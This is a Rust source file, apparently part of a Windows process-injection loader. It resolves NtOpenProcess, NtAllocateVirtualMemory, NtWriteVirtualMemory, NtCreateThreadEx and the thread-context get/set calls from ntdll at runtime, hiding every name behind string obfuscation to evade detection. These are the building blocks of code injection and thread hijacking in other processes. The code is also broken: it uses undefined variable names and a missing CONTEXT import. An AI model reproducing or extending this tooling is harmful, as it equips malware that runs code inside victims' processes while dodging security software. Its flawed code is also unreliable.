use winapi::shared::ntdef::HANDLE;
use std::sync::OnceLock;
use obfuse::obfuse;
use export_resolver::ExportList;
use anyhow::{self, Ok};


pub type NtOpenProcessFn = unsafe extern "system" fn(
    ProcessHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *const (),
    ClientId: *const (),
) -> i32;

pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut *mut std::ffi::c_void,
    ZeroBits: usize,
    RegionSize: *mut usize,
    AllocationType: u32,
    Protect: u32,
) -> i32;

pub type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut std::ffi::c_void,
    Buffer: *const std::ffi::c_void,
    NumberOfBytesToWrite: usize,
    NumberOfBytesWritten: *mut usize,
) -> i32;

pub type NtCreateThreadExFn = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *const (),
    ProcessHandle: HANDLE,
    StartAddress: *mut std::ffi::c_void,
    Parameter: *mut std::ffi::c_void,
    CreateSuspended: i32,
    StackZeroBits: usize,
    SizeOfStackCommit: usize,
    SizeOfStackReserve: usize,
    lpBytesBuffer: *mut std::ffi::c_void,
) -> i32;


pub type ZwGetContextThreadFn = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ThreadContext: *mut CONTEXT,
) -> i32;

pub type ZwSetContextThreadFn = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ThreadContext: *const CONTEXT,
) -> i32;




pub static NT_WRITE_VIRTUAL_MEMORY_ADDR: OnceLock<NtWriteVirtualMemoryFn> = OnceLock::new();
pub static NT_OPEN_PROCESS_ADDR: OnceLock<NtOpenProcessFn> = OnceLock::new();
pub static NT_CREATE_THREAD_EX_ADDR: OnceLock<NtCreateThreadExFn> = OnceLock::new();
pub static NT_ALLOCATE_VIRTUAL_MEMORY_ADDR: OnceLock<NtAllocateVirtualMemoryFn> = OnceLock::new();
pub static ZW_GET_CONTEXT_THREAD_ADDR: OnceLock<ZwGetContextThreadFn> = OnceLock::new();
pub static ZW_SET_CONTEXT_THREAD_ADDR: OnceLock<ZwSetContextThreadFn> = OnceLock::new();


macro_rules! set_nt_func {
    ($exports:ident, $name_str:expr, $lock:expr) => {
        unsafe {
            // 1. 获取地址并处理 Result (?)
            let addr = $exports.get_function_address($name_str)? as *const std::ffi::c_void;
            // 2. 转换并设置全局变量
            // 注意：transmute 会根据 $lock 里的泛型自动推导出目标函数类型
            if $lock.set(std::mem::transmute(addr)).is_err() {
                // 如果设置失败，说明之前已经初始化过了，这里可以根据需求处理
            }
        }
    };
}


pub fn init_nt_api() -> Result<()>{
    let obfused_ntdll = obfuse!("ntdll.dll\0");
    let ntdll_str = obfused_ntdll.as_str();

    let obfused_zw_get_context_thread = obfuse!("ZwGetContextThread\0");
    let obfused_zw_set_context_thread = obfuse!("ZwSetContextThread\0");
    let obfused_nt_open_process = obfuse!("NtOpenProcess\0");
    let obfused_nt_allocate_virtual_memory = obfuse!("NtAllocateVirtualMemory\0");
    let obfused_nt_write_virtual_memory = obfuse!("NtWriteVirtualMemory\0");
    let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx\0");

    let str_nt_open_process = obfused_nt_open_process.as_str();
    let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
    let str_nt_write_virtual_memory = obfused_nt_write_virtual_memory.as_str();
    let str_nt_create_thread_ex = obfused_nt_create_thread_ex.as_str();
    let str_zw_get_context_thread = obfused_nt_get_context_thread.as_str();
    let str_zw_set_context_thread = obfused_nt_set_context_thread.as_str();


    let mut exports = ExportList::new();
    exports.add(ntdll_str, str_nt_open_process)?;
    exports.add(ntdll_str, str_nt_allocate_virtual_memory)?;
    exports.add(ntdll_str, str_nt_write_virtual_memory)?;
    exports.add(ntdll_str, str_nt_create_thread_ex)?;
    exports.add(ntdll_str, str_zw_get_context_thread)?;
    exports.add(ntdll_str, str_zw_set_context_thread)?;

    set_nt_func!(exports, str_nt_open_process, NT_OPEN_PROCESS_ADDR);
    set_nt_func!(exports, str_nt_allocate_virtual_memory, NT_ALLOCATE_VIRTUAL_MEMORY_ADDR);
    set_nt_func!(exports, str_nt_write_virtual_memory, NT_WRITE_VIRTUAL_MEMORY_ADDR);
    set_nt_func!(exports, str_nt_create_thread_ex, NT_CREATE_THREAD_EX_ADDR);
    set_nt_func!(exports, str_zw_get_context_thread, ZW_GET_CONTEXT_THREAD_ADDR);
    set_nt_func!(exports, str_zw_set_context_thread, ZW_SET_CONTEXT_THREAD_ADDR);


    Ok(())
}